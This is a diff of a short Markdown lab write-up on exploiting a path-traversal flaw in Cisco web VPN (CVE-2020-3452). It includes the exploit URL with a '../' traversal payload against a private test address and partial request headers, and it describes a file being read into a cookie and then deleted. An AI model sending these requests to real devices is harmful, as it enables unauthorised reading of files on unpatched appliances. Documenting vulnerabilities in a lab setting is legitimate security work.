@@ -1,4 +1,6 @@
-## Verify that the vulnerability exists :
+# Exploit CISCO Remove File Via session_password.html
+
+## Detect and Verify that the vulnerability:
 
 Downloaded the vulnerable code and compared it with the code from local environment.
 ![LFD](lfd.png)
@@ -11,8 +13,8 @@ Vuln:
 Patched:
 ![fixed](fixed.png)
 
-## Exploiting the vulnerability on local environment:
-Trying to download a file:
+## Exploiting the vulnerability:
+Trying to download a file using CVE-2020-3452:
 
 https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/wrong_url.html&default-language&lang=../
 
@@ -37,7 +39,7 @@ Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 ```
 
-The file is read and stored in webvpn cookie and then deleted
+The file is read and stored in webvpn cookie and then deleted.
 ![delete_file.png](delete_file.png)
 
 ```
@@ -45,4 +47,5 @@ https://192.168.1.100/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b
 
 ```
 
+This file has been deleted.
 ![file_after_delete.png](file_after_delete.png)
